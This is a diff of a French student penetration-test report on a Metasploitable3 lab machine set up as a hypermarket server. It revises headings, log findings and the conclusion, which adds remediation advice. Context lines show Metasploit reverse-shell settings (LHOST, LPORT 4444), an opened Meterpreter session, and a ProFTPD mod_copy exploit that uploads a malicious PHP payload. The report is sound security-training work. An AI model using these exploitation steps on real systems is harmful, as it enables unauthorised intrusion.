@@ -1,5 +1,8 @@
 **| E4 - Metz - CACCIATORE Vincent |**  
-*avec GRECO Clément*  
+***avec GRECO Clément***
+
+*03 septembre 2025*
+
 # Rapport de Pentest – Hypermarché
 
 ## 📑 Table des matières
@@ -40,7 +43,7 @@ Notre rôle est de réaliser un pentest interne pour :
 - **Cible** : Metasploitable3 (VM Ubuntu 14.04).  
 - **Réseau** : 192.168.1.0/24 (réseau interne).  
 
-### Schéma
+### Schéma de l'infrastructure
 ![alt text](image-34.png)
 
 ---
@@ -507,7 +510,8 @@ Exploration des journaux via l’interface web :
 ![alt text](image-37.png)
 ![alt text](image-38.png)
 
-Les logs montrent des connexions et tentatives d’ajout d’imprimantes mais aucune compromission réussie.
+Les logs montrent les requêtes de "l’attaquant" (ajout d’imprimantes, tests IPP, etc.), prouvant que le service journalise bien les accès.
+➡️ Cela augmente les chances de détection par un administrateur.
 
 #### 🚀 Étape 3 – Recherche et exploitation Metasploit
 
@@ -708,6 +712,7 @@ run
 
 ##### 3. Résultat
 ![alt text](image-35.png)
+
 Une session **Meterpreter** a été ouverte avec succès :
 
 ```
@@ -728,7 +733,7 @@ L’attaquant peut exécuter n’importe quelle commande système avec les privi
 - un **risque critique pour l’intégrité et la confidentialité des données**.
 
 
-
+---
 
 
 ### 4.7 🔹 FTP (ProFTPD 1.3.5 – mod_copy)
@@ -770,7 +775,9 @@ set LHOST 192.168.1.30
 set LPORT 4444
 run
 ```
+
 ![alt text](image-24.png)
+
 📌 Résultat :  
 - Upload d’un payload PHP malveillant dans `/var/www/html/odiel1.php`.  
 - Exécution du payload → **reverse shell obtenu**.
@@ -883,9 +890,18 @@ L’analyse de l'ancien serveur de l'hypermarché a montré plusieurs points cri
 ---
 
 ## 8. ✅ Bilan
-Le système présente plusieurs **failles critiques exploitables** (SSH faible, phpMyAdmin root accessible, Continuum obsolète).  
-Même si certains services n’ont pas donné lieu à une compromission (CUPS, Samba, MySQL restreint), ils augmentent la surface d’attaque et nécessitent une vigilance accrue.  
+Le serveur audité, utilisé par l’hypermarché, présente plusieurs **failles critiques exploitables** :  
+- un accès SSH possible via des identifiants faibles,  
+- un phpMyAdmin accessible avec l’utilisateur `root` sans mot de passe,  
+- et une application métier (Continuum) obsolète permettant une exécution de code à distance.  
 
-L’exploitation réussie de SSH, phpMyAdmin et Jetty/Continuum démontre que **l’attaquant peut obtenir un accès root complet**, compromettant à la fois le système et les données.  
+Ces vulnérabilités démontrent que **n’importe quel attaquant** connecté au réseau interne pourrait obtenir un accès complet au système avec les privilèges **root**. Cela met en danger la confidentialité des données de l’entreprise, l’intégrité des applications et la disponibilité du service.  
 
-➡️ **Une remédiation urgente et une refonte de la configuration de sécurité sont nécessaires.**
+Même si certains services n’ont pas permis une compromission directe (CUPS, Samba, MySQL restreint), leur simple exposition augmente la surface d’attaque et devra être corrigée.  
+
+➡️ **Une remédiation urgente est indispensable** :  
+- mise à jour ou désinstallation des services obsolètes (Apache, Continuum, ProFTPD),  
+- durcissement de la configuration (désactivation de phpMyAdmin public, politiques de mots de passe fortes, restriction d’accès SSH),  
+- surveillance accrue des journaux et mise en place d’un pare-feu adapté.  
+
+Ces mesures permettront à l’entreprise de **réduire considérablement son exposition aux risques** et de protéger ses données sensibles face à de futures attaques.
